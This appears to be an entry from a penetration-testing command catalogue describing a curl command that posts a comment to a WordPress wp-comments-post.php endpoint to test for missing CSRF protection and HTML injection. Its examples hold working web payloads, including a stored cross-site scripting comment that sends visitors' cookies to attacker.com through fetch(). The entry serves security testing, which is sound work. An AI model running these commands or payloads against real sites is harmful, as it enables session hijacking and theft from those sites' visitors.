---
data: >-
  curl -X POST $URL -d "comment=$PAYLOAD" -d "comment_post_ID=$POST_ID" -d
  "submit=Post Comment" --referer "$REFERER"
tags:
  - web
  - csrf
  - test
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:27:57.697Z'
id: bdd617a4-94e4-4773-9fe0-0ae170d520e8
verified: false
validated: true
submitted: true
---
# curl-submit-csrf-comment

## Command

```bash
curl -X POST $URL -d "comment=$PAYLOAD" -d "comment_post_ID=$POST_ID" -d "submit=Post Comment" --referer "$REFERER"
```

## Description

This command uses curl to simulate a CSRF attack by posting a malicious comment to a WordPress site's wp-comments-post.php endpoint, testing for lack of CSRF protection and HTML injection.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `$URL` | Target WordPress comment submission URL (e.g., https://target.com/wp-comments-post.php) | Yes |
| `$PAYLOAD` | Malicious HTML/JS payload for injection (e.g., <script>alert('XSS')</script>) | Yes |
| `$POST_ID` | ID of the target post | Yes |
| `$REFERER` | Fake referer to mimic cross-site request (e.g., https://attacker.com) | No |

## Examples

### Basic Usage

```bash
curl -X POST https://target.com/wp-comments-post.php -d "comment=<script>alert('Test')</script>" -d "comment_post_ID=123" -d "submit=Post Comment"
```

### Advanced Usage

```bash
curl -X POST https://target.com/wp-comments-post.php -d "comment=<script>fetch('https://attacker.com?data='+document.cookie)</script>" -d "comment_post_ID=123" -d "submit=Post Comment" --referer "https://fake.com" -v
```

## Expected Output

A successful response (HTTP 200 or redirect to post page) without CSRF errors indicates vulnerability. No output if injection succeeds; verify by checking the post comments.

## Related

- [[Related Procedure|procedures/Exploit-WordPress-Comments-CSRF-for-HTML-Injection]]
